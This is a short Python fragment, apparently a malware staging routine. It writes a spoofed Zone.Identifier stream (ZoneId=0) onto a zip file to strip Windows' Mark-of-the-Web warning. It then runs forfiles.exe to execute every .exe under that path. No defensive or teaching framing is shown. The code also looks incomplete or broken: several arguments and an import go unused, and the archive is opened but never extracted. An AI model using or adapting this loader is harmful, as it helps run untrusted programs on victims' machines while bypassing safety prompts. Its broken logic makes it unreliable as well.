import subprocess
import zipfile
import base64

def stage(path, encoded, key):
    archive = zipfile.ZipFile(path)
    with open(path + ':Zone.Identifier', 'w') as zone:
        zone.write('[ZoneTransfer]\r\nZoneId=0\r\n')
    subprocess.Popen(['forfiles.exe', '/p', path, '/m', '*.exe', '/c', 'cmd /c call @path'])
